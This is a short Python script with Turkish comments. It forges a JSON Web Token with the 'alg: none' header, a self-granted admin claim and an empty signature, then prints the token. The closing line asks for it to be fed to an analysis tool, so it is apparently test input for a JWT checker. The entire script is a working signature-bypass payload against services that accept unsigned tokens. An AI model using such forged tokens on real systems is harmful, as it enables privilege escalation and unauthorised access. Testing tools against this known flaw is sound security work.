import base64
import json

# Kendimize sahte bir admin yetkisi veriyoruz
payload = {
    "sub": "9876543210",
    "name": "Hacker_Kerem",
    "admin": True 
}

# Header kısmında algoritmayı bilerek 'none' yapıyoruz
header = {
    "alg": "none",
    "typ": "JWT"
}

def encode_b64(data):
    json_data = json.dumps(data).encode('utf-8')
    return base64.urlsafe_b64encode(json_data).decode('utf-8').rstrip('=')

header_b64 = encode_b64(header)
payload_b64 = encode_b64(payload)

# DİKKAT: En sonda imza (signature) yok, sadece nokta var!
malicious_token = f"{header_b64}.{payload_b64}."

print("\n[+] 'None' Algoritmalı Zararlı Token Üretildi:")
print(malicious_token)
print("\nBu token'ı araca analiz ettirin.\n")